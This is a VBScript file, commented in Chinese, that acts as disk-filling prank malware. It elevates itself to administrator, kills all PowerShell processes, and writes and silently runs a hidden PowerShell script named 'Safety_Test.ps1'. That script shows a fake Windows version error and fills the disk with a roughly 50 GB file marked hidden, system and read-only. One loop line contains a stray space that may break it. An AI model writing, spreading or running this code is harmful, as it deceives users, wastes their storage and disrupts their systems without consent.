' --- 1. 自动请求管理员权限 ---
Set objShell = CreateObject("Shell.Application")
If Not WScript.Arguments.Named.Exists("elevate") Then
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
    WScript.Quit
End If

Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

' --- 2. 暴力清理：结束所有可能冲突的 PowerShell 进程 ---
' 这样可以释放被锁定的文件句柄
WshShell.Run "taskkill /F /IM powershell.exe /T", 0, True

' --- 3. 动态获取路径并处理旧文件 ---
CurrentDir = fso.GetParentFolderName(WScript.ScriptFullName)
psPath = CurrentDir & "\Safety_Test.ps1"
targetFile = CurrentDir & "\core_dump.txt"

' 如果文件已存在，先强行去掉所有属性（只读、系统、隐藏）并删除
On Error Resume Next
WshShell.Run "attrib -s -h -r " & Chr(34) & psPath & Chr(34), 0, True
WshShell.Run "attrib -s -h -r " & Chr(34) & targetFile & Chr(34), 0, True
fso.DeleteFile psPath, True
fso.DeleteFile targetFile, True
On Error GoTo 0

' --- 4. 重新写入 Safety_Test.ps1 ---
Set psFile = fso.CreateTextFile(psPath, True)
psFile.WriteLine "$TargetDir = '" & CurrentDir & "'"
psFile.WriteLine "$BigFile = Join-Path $TargetDir 'core_dump.txt'"
psFile.WriteLine "Add-Type -AssemblyName PresentationFramework"
psFile.WriteLine "[System.Windows.MessageBox]::Show('Windows Version Error: build 23H2 incompatible.', 'System Error', 0, 16)"
psFile.WriteLine "$Stream = [System.IO.File]::OpenWrite($BigFile)"
psFile.WriteLine "$Buffer = New-Object Byte[] 1048576"
psFile.WriteLine "for($  i=1; $i -le 51200; $i++) { $Stream.Write($Buffer, 0, $Buffer.Length); Start-Sleep -Milliseconds 0 }"
psFile.WriteLine "$Stream.Close()"
psFile.WriteLine "attrib +h +s +r $BigFile"
psFile.Close

' --- 5. 深度隐藏脚本并静默运行 ---
fso.GetFile(psPath).Attributes = 2 + 4
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & Chr(34) & psPath & Chr(34), 0, False

Set fso = Nothing
Set WshShell = Nothing
